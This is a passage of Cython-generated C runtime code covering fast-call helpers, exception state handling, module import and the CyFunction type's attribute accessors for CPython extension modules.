    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
